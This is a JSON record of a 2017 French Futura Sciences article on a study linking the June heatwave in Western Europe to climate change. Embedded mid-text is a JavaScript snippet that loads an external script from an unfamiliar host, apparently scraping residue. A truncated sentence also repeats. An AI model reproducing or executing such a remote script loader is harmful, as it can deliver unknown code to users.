{"title": "La canicule de juin en partie due au réchauffement climatique", "newspaper": "Futura Sciences", "author": "Xavier Demeersman", "date_publi": "04/07/2017", "content": "La vague de chaleur qui a sévi en juin dans plusieurs pays d'Europe de l'ouest est liée au réchauffement climatique, affirment des chercheurs. L'intensité et la fréquence de ces évènements sont plus élevées qu'il y a 30 ans, avec une probabilité quatre fois plus forte en France. Nous devons nous attendre à vivre de semblables épisodes caniculaires tous les 10 à 30 ans, selon les pays. Ce qu'il faut retenir Des plans canicules ont été déclenchés dans plusieurs pays d’Europe occidentale en juin 2017. Selon une étude, le réchauffement climatique en cours a rendu l’intensité et la fréquence des vagues de chaleur au moins deux fois plus probables en Belgique, quatre fois plus dans le centre de l’Angleterre, en France, aux Pays-Bas et en Suisse, et au moins 10 fois plus en Espagne et au Portugal. « Les mois chauds ne sont désormais plus rares dans notre climat actuel »  a déclaré l’un des auteurs de ces recherches.   Selon une étude scientifique qui a analysé les températures record enregistrées dans sept pays de l'Europe occidentale en ce mois de juin 2017 (3 °C en moyenne au-dessus de la moyenne de la période de référence 1981-2010), le  réchauffement climatique  global a joué un rôle majeur dans ces épisodes caniculaires. Dans leur  article , les chercheurs concluent que l'intensité et la  fréquence  des vagues de  chaleur  sont désormais au moins deux fois plus probables en Belgique, quatre fois plus en France, en Suisse, aux Pays-Bas et dans le centre de l'Angleterre. Pour l'Espagne et le Portugal, la probabilité est multipliée par 10 au moins. Pour l'un des auteurs, Friederike Otto, qui s'exprime dans un  communiqué de l'IPSL  (Institut Pierre-Simon de Laplace), ces  « résultats sont compatibles avec une planète qui se réchauffe » , où les périodes de chaleur seront plus fréquentes et intenses et se produisent plus tôt ou plus tard dans l'été. Pour ce chercheur de l'université d'Oxford,  « il est essentiel que les villes travaillent avec des scientifiques et des experts en santé publique pour élaborer des plans d'action en cas de  canicule . La  chaleur peut être mortelle , surtout pour les très jeunes et pour les personnes âgées. Les changements climatiques ont d'ores et déjà un impact sur les populations et ces plans permettent de sauver des vies. » Probabilité pour que la température moyenne de juin dans la période 2070-2099 dépasse la température moyenne maximale de la période de référence 1981-2010 en juin, pour deux scénarios de développement économique (émissions de gaz à effet de serre moyenne à gauche et forte à droite). © WWA                               Des mois chauds qui ne sont désormais plus rares Son collègue Geert Jan van Oldenborgh, du  Royal Netherlands Meteorological Institute  (KNMI) a déclaré :  « Nous avons trouvé des liens clairs et  solides  entre la  canicule  du mois de juin et le changement climatique causé par l'Homme. Les enregistrements locaux de la température montrent une tendance au réchauffement, plus rapide encore que dans les  modèles climatiques  qui simulent les effets de la  combustion  des  énergies fossiles , mais aussi de la variabilité solaire et des changements de l'utilisation des  terres  » .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  “ Au milieu du  e  siècle, ce genre de chaleur extrême en juin deviendra la norme en Europe occidentale, sauf si nous prenons des mesures. « Les mois chauds ne sont désormais plus rares dans notre  climat  actuel. Aujourd'hui, nous pouvons nous attendre à une  canicule  telle que nous en avons connu en juin environ tous les 10 à 30 ans, selon le pays , a indiqué Robert Vautard, chercheur au Laboratoire des sciences de l'environnement et du climat (LSCE-IPSL) et co-auteur de l'étude.  Au milieu du XXI e  siècle, ce genre de chaleur extrême en juin deviendra la norme en Europe occidentale, sauf si nous prenons des mesures immédiates pour réduire les  émissions  de  gaz à effet de serre . » ", "theme": "planete"}